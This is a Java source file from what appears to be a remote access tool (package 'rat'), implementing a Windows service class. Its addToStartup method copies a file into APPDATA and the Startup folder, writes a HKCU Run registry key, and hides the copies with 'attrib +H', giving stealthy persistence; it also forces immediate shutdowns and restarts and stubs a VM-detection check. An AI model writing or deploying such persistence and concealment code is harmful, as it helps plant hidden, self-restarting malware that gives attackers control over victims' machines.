/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.service;

import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

import de.sogomn.engine.util.FileUtils;

public final class WindowsService implements IOperatingSystemService {
	
	private static final String SHUTDOWN_COMMAND = "shutdown /s /t 0";
	private static final String RESTART_COMMAND = "shutdown /r /t 0";
	private static final String STARTUP_DIRECTORY_PATH = System.getenv("APPDATA");
	private static final String STARTUP_DIRECTORY_PATH_2 = System.getenv("APPDATA") + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "Start Menu" + File.separator + "Programs" + File.separator + "Startup";
	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU" + File.separator + "Software" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run /v \"%s\" /d \"%s\" /f";
	private static final String STARTUP_REGISTRY_REMOVE_COMMAND = "REG DELETE HKCU" + File.separator + "Software" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run /v \"%s\" /f";
	private static final String HIDE_FILE_COMMAND = "attrib +H %s";
	
	
	WindowsService() {
		//...
	}
	
	@Override
	public void shutDown() {
		try {
			Runtime.getRuntime().exec(SHUTDOWN_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void restart() {
		try {
			Runtime.getRuntime().exec(RESTART_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void addToStartup(final Path file) {
		final String name = file.getFileName().toString();
		final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
		final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
		final Path destination = Paths.get(path);
		final Path destination2 = Paths.get(path2);
		final String registryCommand = String.format(STARTUP_REGISTRY_COMMAND, name, path);
		final String hideFileCommand = String.format(HIDE_FILE_COMMAND, path);
		final String hideFileCommand2 = String.format(HIDE_FILE_COMMAND, path2);
		
		FileUtils.createFile(path);
		FileUtils.copyFile(file, destination);
		FileUtils.copyFile(file, destination2);
		
		try {
			Runtime.getRuntime().exec(registryCommand);
			Runtime.getRuntime().exec(hideFileCommand);
			Runtime.getRuntime().exec(hideFileCommand2);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void removeFromStartup(final String name) {
		final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
		final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
		final String registryRemoveCommand = String.format(STARTUP_REGISTRY_REMOVE_COMMAND, name);
		
		FileUtils.deleteFile(path);
		FileUtils.deleteFile(path2);
		
		try {
			Runtime.getRuntime().exec(registryRemoveCommand);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public boolean isVm() {
		return false;
	}
	
}
